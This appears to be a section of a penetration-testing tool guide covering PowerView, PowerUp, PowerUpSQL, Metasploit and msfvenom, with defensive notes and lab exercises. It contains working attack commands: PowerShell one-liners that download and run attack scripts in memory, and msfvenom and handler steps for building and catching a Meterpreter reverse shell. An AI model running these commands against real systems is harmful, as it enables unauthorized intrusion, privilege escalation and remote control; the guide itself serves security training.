### PowerView + PowerUp + PowerUpSQL

These are PowerShell-based post-exploitation and enumeration tools, part of the PowerSploit framework. **When to use it:**

- **PowerView:** For extensive enumeration of an Active Directory domain (users, groups, computers, GPOs, ACLs) from a compromised host.
- **PowerUp:** To find local privilege escalation vectors on a Windows host (e.g., unquoted service paths, weak service permissions, AlwaysInstallElevated).
- **PowerUpSQL:** To discover, enumerate, and attack SQL Server instances within a domain. **Quick usage (learning):** These are PowerShell scripts, typically loaded into memory to avoid writing to disk.

PowerShell

```
# Load PowerView into the current PowerShell session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Get information about the current domain
Get-NetDomain

# Find local privilege escalation vulnerabilities with PowerUp
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Discover SQL servers on the domain with PowerUpSQL
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
Get-SQLInstanceDomain
```

**Common flags / options:** These are PowerShell cmdlets, not executables with flags. They use standard PowerShell parameter syntax (e.g., `-Identity <UserName>`, `-Domain <DomainName>`). **Authorized commands (AUTHORIZED‑ONLY):** Advanced actionable guidance requires proof of authorization. **Defensive/detection notes:**

- Enable PowerShell Script Block Logging (Event ID 4104) and Module Logging to capture the execution of these scripts.
- Constrain PowerShell language mode to prevent advanced functions used by these tools.
- AMSI (Antimalware Scan Interface) can detect and block malicious PowerShell scripts in memory.
- Regularly patch systems and audit for the misconfigurations that PowerUp finds. **Recommended lab exercise:** On a Windows VM, download and run PowerUp's `Invoke-AllChecks` to identify local misconfigurations. For PowerView, join the machine to an AD lab and run `Get-NetForest` to enumerate domain information. **Further reading / official docs:**
- PowerSploit GitHub: `https://github.com/PowerShellMafia/PowerSploit`
- PowerUpSQL GitHub: `https://github.com/NetSPI/PowerUpSQL`

### Metasploit + msfvenom

The Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploits. `msfvenom` is its standalone payload generator. **When to use it:**

- **Metasploit:** To exploit known vulnerabilities in systems, networks, and applications.
- **Metasploit:** As a comprehensive post-exploitation framework for pivoting, privilege escalation, and data exfiltration.
- **Metasploit:** To manage sessions, listeners, and payloads during a penetration test.
- **msfvenom:** To generate custom shellcode and payloads (e.g., reverse shells, bind shells) in various formats for different operating systems and architectures. **Quick usage (learning):**

1. **Generate a payload with `msfvenom`:**
    
    bash
    
    ```
    # Generate a Windows reverse TCP shell payload
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o shell.exe
    ```
    
2. **Set up a listener in Metasploit (`msfconsole`):**
    
    Code
    
    ```
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set LHOST <YOUR_IP>
    msf6 exploit(multi/handler) > set LPORT 4444
    msf6 exploit(multi/handler) > run
    ```
    
3. Execute `shell.exe` on the target machine to receive a connection. **Common flags / options:**

- **msfvenom:**
    - `-p`: Payload to use.
    - `-f`: Output format (e.g., `exe`, `py`, `dll`).
    - `LHOST`: Listening host (your IP).
    - `LPORT`: Listening port.
    - `-o`: Output file.
- **msfconsole:**
    - `use <module>`: Select an exploit or auxiliary module.
    - `set <OPTION> <VALUE>`: Configure module options.
    - `show options`: Display available options for the current module.
    - `run` or `exploit`: Execute the module. **Authorized commands (AUTHORIZED‑ONLY):** Advanced actionable guidance requires proof of authorization. **Defensive/detection notes:**
- Antivirus and Endpoint Detection and Response (EDR) solutions are designed to detect Metasploit's default payloads and Meterpreter activity.
- Network IDS/IPS can detect staging traffic and common exploit signatures.
- Regularly patch systems to eliminate the vulnerabilities that Metasploit exploits. **Recommended lab exercise:** Use Metasploit to exploit the "vsftpd backdoor" vulnerability on a Metasploitable 2 VM. This is a classic beginner-friendly exploit. **Further reading / official docs:**
- Metasploit Framework Documentation: `https://docs.metasploit.com/`
- Offensive Security (Metasploit Unleashed): `https://www.offsec.com/metasploit-unleashed/`